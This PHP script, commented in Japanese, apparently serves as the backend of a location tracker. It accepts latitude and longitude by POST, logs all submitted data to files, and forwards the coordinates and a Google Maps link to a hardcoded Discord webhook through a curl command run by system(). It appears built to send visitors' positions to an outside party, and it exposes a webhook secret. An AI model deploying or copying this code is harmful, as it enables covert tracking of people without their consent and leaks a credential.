<?php
function dbg($msg) {
    file_put_contents("dbg.txt", date("Y-m-d H:i:s") . " " . $msg . PHP_EOL, FILE_APPEND);
}

// POSTデータ受信ログ
dbg("アクセス: " . json_encode($_POST, JSON_UNESCAPED_UNICODE));
file_put_contents("debug.log", date("Y-m-d H:i:s") . " - POST: " . json_encode($_POST, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);

// データチェック
if (!isset($_POST["lat"]) || !isset($_POST["lng"])) {
    dbg("💥 Error: POSTデータが不足（lat/lng未送信）");
    file_put_contents("debug.log", "💥 Error: POSTデータが不足してるよ〜💦" . PHP_EOL, FILE_APPEND);
    exit("💥 Error: 緯度か経度がPOSTされてないよ〜💦");
}

$lat = escapeshellarg($_POST["lat"]);
$lng = escapeshellarg($_POST["lng"]);

$mapsUrl = "https://www.google.com/maps?q=" . trim($lat, "'") . "," . trim($lng, "'");
$locationMessage = "📍 Location: Latitude = " . trim($lat, "'") . ", Longitude = " . trim($lng, "'");
$mapsUrlMessage = "🗺 Google Maps URL: " . $mapsUrl;

// Discord通知
$webhookUrl = 'https://discordapp.com/api/webhooks/1356867692899860557/anLF-C2F9gOlPyjCgnJm5B1F5yWARixCnRYA6cXmCOXyVvLvOY2WQOjN03QOp5TQzT3x';

function sendToDiscord($message, $webhookUrl) {
    dbg("Discord送信準備: $message");
    $json = json_encode(["content" => $message], JSON_UNESCAPED_UNICODE);
    $cmd = "curl -H 'Content-Type: application/json' -X POST -d " . escapeshellarg($json) . " " . escapeshellarg($webhookUrl) . " > /dev/null 2>&1";
    dbg("curlコマンド: $cmd");
    system($cmd, $retval);
    dbg("curl結果: $retval");
}

sendToDiscord($locationMessage, $webhookUrl);
sendToDiscord($mapsUrlMessage, $webhookUrl);

dbg("🎉 Location送信完了");
echo "🎉 Location送信完了〜っ！\n";
?>
